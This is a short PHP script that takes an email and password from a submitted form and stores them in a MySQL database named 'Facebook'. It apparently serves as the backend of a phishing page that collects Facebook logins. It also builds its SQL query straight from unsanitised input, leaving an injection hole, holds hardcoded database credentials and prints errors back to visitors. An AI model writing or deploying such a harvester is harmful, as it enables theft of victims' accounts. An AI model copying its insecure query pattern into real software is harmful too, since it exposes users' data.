<?php

$user = 'Spidy';
$password = 'Edgeis10';
$host = 'localhost';
$dbname = "Facebook";

$conn = new mysqli($host, $user, $password ,$dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email = $_POST['email'];
$password = $_POST['pass'];

$sql = "INSERT INTO data (email, passsword)
VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
